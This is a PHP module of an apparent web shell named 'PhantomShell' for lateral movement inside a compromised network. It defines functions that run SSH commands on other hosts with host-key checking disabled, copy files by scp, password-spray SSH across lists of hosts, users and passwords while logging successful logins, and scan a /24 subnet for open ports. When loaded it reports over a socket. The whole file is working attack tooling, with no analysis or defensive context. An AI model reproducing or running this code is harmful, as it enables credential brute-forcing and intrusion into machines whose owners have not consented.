<?php
// PhantomShell Module: Lateral Movement
// Load via MINIMAL mode: fetch lateral

function mod_lateral_ssh($target, $password = '') {
    $cmd = $password
        ? 'sshpass -p ' . escapeshellarg($password) . ' ssh -o StrictHostKeyChecking=no ' . $target . ' id 2>&1'
        : 'ssh -o StrictHostKeyChecking=no -o BatchMode=yes ' . $target . ' id 2>&1';
    $o = '';
    if(function_exists('shell_exec')) $o = (string)@shell_exec($cmd);
    return $o;
}

function mod_lateral_scp($src, $dest) {
    $cmd = "scp -o StrictHostKeyChecking=no $src $dest 2>&1";
    $o = '';
    if(function_exists('shell_exec')) $o = (string)@shell_exec($cmd);
    return $o;
}

function mod_lateral_spray($targets, $usernames, $passwords) {
    $results = array();
    foreach ($targets as $t) {
        foreach ($usernames as $u) {
            foreach ($passwords as $p) {
                $cmd = "sshpass -p " . escapeshellarg($p) . " ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 " .
                    escapeshellarg($u) . "@" . escapeshellarg($t) . " id 2>&1";
                $o = '';
                if(function_exists('shell_exec')) $o = (string)@shell_exec($cmd);
                if (strpos($o, 'uid=') !== false) {
                    $results[] = array('host' => $t, 'user' => $u, 'pass' => $p, 'output' => trim($o));
                }
            }
        }
    }
    return $results;
}

function mod_subnet_scan($subnet, $ports = array(22, 80, 443, 445, 3389)) {
    $results = array();
    $base = substr($subnet, 0, strrpos($subnet, '.'));
    for ($i = 1; $i <= 254; $i++) {
        $ip = "$base.$i";
        foreach ($ports as $port) {
            $fp = @fsockopen($ip, $port, $en, $es, 0.3);
            if ($fp) {
                @fclose($fp);
                if (!isset($results[$ip])) $results[$ip] = array();
                $results[$ip][] = $port;
            }
        }
    }
    return $results;
}

if (isset($sock)) {
    @fwrite($sock, "  Lateral module loaded.\n");
    @fwrite($sock, "  Functions: mod_lateral_ssh, mod_lateral_scp, mod_lateral_spray, mod_subnet_scan\n");
}
?>
